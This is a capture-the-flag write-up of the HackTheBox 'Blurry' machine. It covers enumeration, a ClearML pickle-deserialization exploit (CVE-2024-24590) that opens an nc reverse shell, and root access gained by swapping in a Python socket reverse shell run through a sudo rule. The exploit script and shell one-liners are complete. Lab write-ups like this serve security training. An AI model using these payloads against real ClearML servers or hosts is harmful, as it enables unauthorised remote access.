---
title: "Blurry Writeup - HackTheBox"
date: 2024-10-13
draft: false
Tags:
- HackTheBox
- Linux
- Medium
---

| Link: | [https://app.hackthebox.com/machines/Blurry](https://app.hackthebox.com/machines/Blurry) |
| --- | --- |
| Difficulty | Medium |
| Machine | Linux |

---

## Enumeration

I performed a quick Nmap scan on the target to identify open ports:

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

After discovering the open ports, I conducted an aggressive scan on the target for a more in-depth analysis using:

`sudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A` 

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
```

I discovered that the HTTP server is hosted at **blurry.htb**, and the Nmap results also revealed **app.blurry.htb**. To access these web pages, I added both domains to the `/etc/hosts` file using the following command:

```
echo "10.10.11.19 blurry.htb app.blurry.htb" >> /etc/hosts
```

I also ran a Gobuster vhost scan to search for additional subdomains:

```
gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain
```

Surprisingly, the scan revealed more subdomains. I added all of them to the `/etc/hosts` file as well:

```
echo "10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb" >> /etc/hosts
```

After visiting all the subdomains, I noticed that **files.blurry.htb** only displayed a simple "OK" message.

The **app.blurry.htb** subdomain hosts **ClearML**, a platform used for building AI projects. When submitting any name, it allows users to join a project as a developer. The next step is to configure it on our local machine.

![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled.png)

The **chat.blurry.htb** subdomain hosts the third-party service **Rocket.Chat** on its own.

![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%201.png)

It looks similar to Discord. I registered an account and logged in to the page.

![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%202.png)

There seems to be a default **#general** channel for new accounts, which reveals that `jippity` is the admin.

## User Flag

Now, I will try to set up ClearML locally on my machine.

I followed this guide to set it up:

```
┌──(kali㉿kali)-[~/blurry]
└─$ sudo apt install python3.11-venv
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libdaxctl1 libgphoto2-l10n libndctl6 libntfs-3g89 libpmem1 libre2-10 linux-image-6.6.9-amd64 python3-mistune0
  samba-ad-provision samba-dsdb-modules
Use 'sudo apt autoremove' to remove them.
The following NEW packages will be installed:
  python3.11-venv
0 upgraded, 1 newly installed, 0 to remove and 394 not upgraded.
Need to get 5,884 B of archives.
After this operation, 28.7 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 python3.11-venv amd64 3.11.9-1 [5,884 B]
Fetched 5,884 B in 0s (62.8 kB/s)
Selecting previously unselected package python3.11-venv.
(Reading database ... 461710 files and directories currently installed.)
Preparing to unpack .../python3.11-venv_3.11.9-1_amd64.deb ...
Unpacking python3.11-venv (3.11.9-1) ...
Setting up python3.11-venv (3.11.9-1) ...

┌──(kali㉿kali)-[~/blurry]
└─$ python3 -m venv .env            

┌──(kali㉿kali)-[~/blurry]
└─$ source .env/bin/activate

┌──(.env)─(kali㉿kali)-[~/blurry]
└─$ pip install clearml
[...INSTALLING CLEARML....]

┌──(.env)─(kali㉿kali)-[~/blurry]
└─$ clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "Y2Y197NIHJ5OJJRTFBAR"
    "secret_key" = "Kx5UxAWA9XaiR9wyiodtWoxxGjrO5lPPLeF1MhwOjZagsDGXH3"
  }
}
Detected credentials key="Y2Y197NIHJ5OJJRTFBAR" secret="Kx5U***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/kali/clearml.conf
ClearML setup completed successfully.

```

The configuration file can be found at the **app.blurry.htb** endpoint when we enter a username, select "New Experiment," and retrieve the config file from there.

![Untitled](Blurry%20b534b7f9d35247b2b536889719c43db2/Untitled%203.png)

I found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.

```
import os
import subprocess
from clearml import Task

class ShellExecutor:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 4444 >/tmp/f"
        return (subprocess.call, (cmd,))

shell_executor = ShellExecutor()

task = Task.init(
    project_name="Black Swan",
    task_name="r3zyd3v",
    tags=["review"],
    task_type=Task.TaskTypes.data_processing,
    output_uri=True
)

task.upload_artifact(
    name="r3zyd3v",
    artifact_object=shell_executor,
    retries=2,
    wait_on_upload=True
)

task.execute_remotely(queue_name='default')
```

Now, if I execute the above script in the same location where I installed ClearML, I will get a shell on port 4444. In my script, I have specified my tun0 IP address and the port for the reverse shell:

`cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.62 4444 >/tmp/f"` here.

Once we run the script, it creates a task, uploads the artifact, and then we receive the shell.

At this point, we have a shell as the user and have obtained the user flag.

## Root Flag

If I run `sudo -l`, I can see that I can execute the `/usr/bin/evaluate_model` binary as root without needing a password.

```
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

This Bash script searches for files that end with `.pth` in the `/models` directory, removes any malicious content, and then executes them. I also checked that we have write access to the models directory.

I will now open a Netcat session on my Kali machine on port 6969. Then, I removed the `evaluate_model.py` script from the `/models` directory.

```
jippity@blurry:~$ cd /models
jippity@blurry:/models$ ls
demo_model.pth  evaluate_model.py
jippity@blurry:/models$ rm -r evaluate_model.py 
rm: remove write-protected regular file 'evaluate_model.py'? y
jippity@blurry:/models$ ls
demo_model.pth
```

I created the same file (which I made using `echo` and appended the code) named `evaluate_model.py` with the script shown below (the output of the `cat` command):

```
jippity@blurry:/models$ echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.16.62", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' > evaluate_model.py
jippity@blurry:/models$ cat evaluate_model.py 
echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.16.62", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' > evaluate_model.py
```

I ran `sudo /usr/bin/evaluate_model /models/*.pth`, and when I checked my Netcat session, I saw:

```
┌──(kali㉿kali)-[~/blurry/CVE]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.62] from (UNKNOWN) [10.10.11.19] 35976
root@blurry:/models# cd ~
cd ~
root@blurry:~# id  
id
uid=0(root) gid=0(root) groups=0(root)
```

We rooted this box. 

## Conclusion

Thank you for following my write-up for this medium yet fun box from Hack The Box!
